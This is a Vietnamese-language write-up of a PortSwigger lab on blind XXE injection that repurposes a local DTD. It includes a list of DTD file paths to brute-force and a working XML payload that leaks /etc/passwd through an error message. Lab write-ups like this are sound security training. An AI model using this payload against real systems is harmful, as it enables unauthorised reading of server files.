Description: This lab has a “Check stock” feature that parses XML input but does not display the result. To solve the lab, trigger an error message containing the contents of the /etc/passwd file. You’ll need to reference an existing DTD file on the server and redefine an entity from it.

Đây là lab cuối cùng trong các lab XXE của Portswigger. Lỗi nằm ở tính năng Check stock. Để solve được thì ta phải trigger 1 thông báo lỗi và có kèm theo nội dung của file /etc/passwd. Ta cần phải refer 1 file DTD có sẵn trên server và định nghĩa lại entity từ file đó.

![image](https://github.com/elliSzAt/XML-external-entity-XXE-injection/assets/125866921/38552bbf-e15d-455a-926f-1ae4b4b3c810)

Về loại hình tấn công XXE ``retrieve data by repurposing a local DTD``.

```
https://mohemiv.com/all/exploiting-xxe-with-local-dtd-files/
```

![image](https://github.com/elliSzAt/XML-external-entity-XXE-injection/assets/125866921/f88af792-c856-4c5b-ab7d-80dfe9a876c2)

Ở đây mình tạo 1 payload để chỉ đến file ``/etc/nonexistent``. Kết quả cho thấy là nó có thể liệt kê ra cả nhưng file đã hoặc không tồn tại. Ta có thể brute force 1 local dtd file trên server(Tùy vào loại server mà file dtd sẽ khác nhau) và định nghĩa lại 1 số parameter-entity bên trong nó.

```
./properties/schemas/j2ee/XMLSchema.dtd
./../properties/schemas/j2ee/XMLSchema.dtd
./../../properties/schemas/j2ee/XMLSchema.dtd
/usr/share/java/jsp-api-2.2.jar!/javax/servlet/jsp/resources/jspxml.dtd
/usr/share/java/jsp-api-2.3.jar!/javax/servlet/jsp/resources/jspxml.dtd
/root/usr/share/doc/rh-python34-python-docutils-0.12/docs/ref/docutils.dtd
/root/usr/share/doc/rh-python35-python-docutils-0.12/docs/ref/docutils.dtd
/usr/share/doc/python2-docutils/docs/ref/docutils.dtd
/usr/share/yelp/dtd/docbookx.dtd
/usr/share/xml/fontconfig/fonts.dtd
/usr/share/xml/scrollkeeper/dtds/scrollkeeper-omf.dtd
/usr/lib64/erlang/lib/docbuilder-0.9.8.11/dtd/application.dtd
/usr/share/boostbook/dtd/1.1/boostbook.dtd
/usr/share/boostbook/dtd/boostbook.dtd
/usr/share/dblatex/schema/dblatex-config.dtd
/usr/share/struts/struts-config_1_0.dtd
/opt/sas/sw/tomcat/shared/lib/jsp-api.jar!/javax/servlet/jsp/resources/jspxml.dtd
```

![image](https://github.com/elliSzAt/XML-external-entity-XXE-injection/assets/125866921/00a9d7b4-3f27-4262-9a83-e2f9a15a5cfa)

Sau khi bruteforce thì ta nhận được file ``/usr/share/yelp/dtd/docbookx.dtd``. Thực hiện tấn công vào nó với payload sau:

```
<!DOCTYPE message [
<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
<!ENTITY % ISOamso '
<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
&#x25;eval;
&#x25;error;
'>
%local_dtd;
]>
```

![image](https://github.com/elliSzAt/XML-external-entity-XXE-injection/assets/125866921/b12762d2-6bcb-41dc-9662-4bd7a3f06b24)

Hoàn thành lab cuối cùng.
